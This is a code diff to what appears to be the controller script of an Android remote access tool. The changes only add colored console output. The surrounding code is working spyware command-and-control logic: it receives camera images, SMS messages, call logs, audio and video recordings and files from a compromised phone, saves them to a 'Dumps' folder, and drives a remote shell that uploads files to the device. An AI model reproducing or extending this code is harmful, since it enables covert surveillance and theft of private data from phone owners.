@@ -8,10 +8,12 @@ import pathlib
 import platform
 import re
 from subprocess import PIPE, run
+from colorama import Fore, Style,init
 
 if(platform.system() == 'Windows'):
     clear = lambda: os.system('cls')
     direc = "\\"
+    init(convert=True)
 else:
     clear = lambda: os.system('clear')
     direc = "/"
@@ -60,29 +62,29 @@ def help():
     print(helper)
 
 def getImage(client):
-    print("Taking Image")
+    print(Style.BRIGHT+Fore.YELLOW+"Taking Image"+Fore.RESET)
     timestr = time.strftime("%Y%m%d-%H%M%S")
     flag=0
     filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
     imageBuffer=recvall(client) 
     imageBuffer = imageBuffer.strip().replace("END123","").strip()
     if imageBuffer=="":
-        print("Unable to Connect to Camera\n")
+        print(Style.BRIGHT+Fore.RED+"Unable to Connect to Camera\n"+Fore.RESET)
         return
     with open(filename,'wb') as img:    
         try:
             imgdata = base64.b64decode(imageBuffer)
             img.write(imgdata)
-            print("Succesfully Saved in "+getpwd(filename)+"\n")
+            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
         except binascii.Error as e:
             flag=1
             print(e)
-            print("Not able to decode the Image\n")
+            print(Style.BRIGHT+Fore.RED+"Not able to decode the Image\n"+Fore.RESET)
     if flag == 1:
         os.remove(filename)
 
 def readSMS(client,data):
-    print("Getting "+data+" SMS")
+    print(Style.BRIGHT+Fore.YELLOW+"Getting "+data+" SMS"+Fore.RESET)
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     filename = "Dumps"+direc+data+"_"+timestr+'.txt'
@@ -91,10 +93,10 @@ def readSMS(client,data):
         msg = recvall(client)
         try:
             txt.write(msg)
-            print("Succesfully Saved in "+getpwd(filename)+"\n")
+            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
         except UnicodeDecodeError:
             flag = 1
-            print("Not able to decode the SMS\n")
+            print(Style.BRIGHT+Fore.RED+"Not able to decode the SMS\n"+Fore.RESET)
     if flag == 1:
     	os.remove(filename)
 
@@ -105,10 +107,10 @@ def getFile(filename,ext,data):
         try:
             rawFile = base64.b64decode(data)
             file.write(rawFile)
-            print("Succesfully Downloaded in "+getpwd(fileData))
+            print(Style.BRIGHT+Fore.GREEN+"Succesfully Downloaded in "+getpwd(fileData)+Fore.RESET)
         except binascii.Error:
             flag=1
-            print("Not able to decode the Audio File")
+            print(Style.BRIGHT+Fore.RED+"Not able to decode the Audio File"+Fore.RESET)
     if flag == 1:
         os.remove(filename)
 
@@ -139,12 +141,12 @@ def shell(client):
                 filedata = filename.split(".")
                 sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                 client.send(sendingData.encode("UTF-8"))
-                print(f"Succesfully Uploaded the file {filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
+                print(Style.BRIGHT+Fore.GREEN+f"Succesfully Uploaded the file {filedata[0]+'.'+filedata[1]} in /sdcard/temp/"+Fore.RESET)
             else:
-                print ("File not exist")
+                print (Style.BRIGHT+Fore.RED+"File not exist"+Fore.RESET)
 
         if "Exiting" in msg:
-            print("----------Exiting Shell----------\n")
+            print(Style.BRIGHT+Fore.YELLOW+"----------Exiting Shell----------\n"+Fore.RESET)
             return
         msg = msg.split("\n")
         for i in msg[:-2]:
@@ -192,7 +194,7 @@ def recvallShell(sock):
     return buff
 
 def stopAudio(client):
-    print("Downloading Audio")
+    print(Style.BRIGHT+Fore.YELLOW+"Downloading Audio"+Fore.RESET)
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag =0
@@ -203,17 +205,17 @@ def stopAudio(client):
         try:
             audioData = base64.b64decode(data)
             audio.write(audioData)
-            print("Succesfully Saved in "+getpwd(filename))
+            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+Fore.RESET)
         except binascii.Error:
             flag=1
-            print("Not able to decode the Audio File")
+            print(Style.BRIGHT+Fore.RED+"Not able to decode the Audio File"+Fore.RESET)
     print(" ")
     if flag == 1:
         os.remove(filename)
 
 
 def stopVideo(client):
-    print("Downloading Video")
+    print(Style.BRIGHT+Fore.YELLOW+"Downloading Video"+Fore.RESET)
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag=0
@@ -224,15 +226,15 @@ def stopVideo(client):
         try:
             videoData = base64.b64decode(data)
             video.write(videoData)
-            print("Succesfully Saved in "+getpwd(filename)+"\n")
+            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
         except binascii.Error:
             flag = 1
-            print("Not able to decode the Video File\n")
+            print(Style.BRIGHT+Fore.RED+"Not able to decode the Video File\n"+Fore.RESET)
     if flag == 1:
         os.remove("Video_"+timestr+'.mp4')
 
 def callLogs(client):
-    print("Getting Call Logs")
+    print(Style.BRIGHT+Fore.YELLOW+"Getting Call Logs"+Fore.RESET)
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     msg = recvall(client)
@@ -245,6 +247,6 @@ def callLogs(client):
     	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
     		txt.write(msg)
     		txt.close()
-    		print("Succesfully Saved in "+getpwd(filename)+"\n")
+    		print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
     		if not os.path.getsize(filename):
     			os.remove(filename)
